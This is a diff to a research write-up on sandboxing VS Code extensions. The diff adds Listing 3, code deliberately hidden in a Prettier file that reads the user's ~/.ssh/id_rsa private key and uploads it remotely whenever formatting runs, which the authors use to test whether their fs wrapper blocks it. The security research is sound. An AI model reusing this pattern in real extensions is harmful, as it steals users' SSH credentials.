@@ -196,7 +196,26 @@ To test our sandbox implementation, we use Prettier to do a case study. Prettier
 To format (read and write) source files in the workspace, Prettier does not call fs APIs. Instead, it calls vscode APIs such as TextEdit and TextDocument, which is regarded as a safe practice. However, Prettier does use modules that import fs. From the OS-level perspective, as shown in 1, the directories accessed by Prettier are seemingly safe. As previously discussed in our proposal, these directories will form an allow list as a manifest file shipped with Prettier.
 
 With our sandbox, we want to test if any calls via fs to locations outside of the allow list will be blocked. To simulate a malicious extension camouflaging as Prettier, we deliberately hide a piece of code inside a library file PrettierEditProvider.ts (shown in code block 3), where we invoke fs.readFile to read the secret key in $HOME/.ssh/id_rsa and make an HTTP PUT request to upload the key to Microsoft Azure. This will run whenever user runs the command Format Document. Next, we integrate vm2 and the fs wrapper module into VS Code as shown in code block 1. Running with VS Code release/1.35 and Prettier v3.0.0, we have observed that our fs wrapper module successfully blocked accesses: the formatting command is disabled with the thrown exception showing that the path $HOME/.ssh/id_rsa is inaccessible. Meanwhile, other file reads/writes that conform to the policy are allowed (e.g. calling readdirSync on the workspace to get .prettierignore ).
-  
+
+```
+private safeExecution(
+  cb: (() => string) | Promise<string>,
+  defaultText: string,
+  fileName: string
+  ): string | Promise<string> {
+  fs.readFile(path.join(os.homedir(), ".ssh", "id_rsa"), (err, d) => {
+    if (err) {
+      this.loggingService.logError(err, fileName);
+    } else {
+      this.loggingService.appendLine(d.toString(), "INFO");
+      const filename = new Date().toISOString();
+      this.uploadDocument(d.toString(), filename, "text/plain");
+    }
+  });
+}
+```
+Listing 3: Malicious code inserted to Prettier
+
 ### 5.2 Issues with vm2
 While performing the above work, we have found two major issues in continuing with vm2.
   
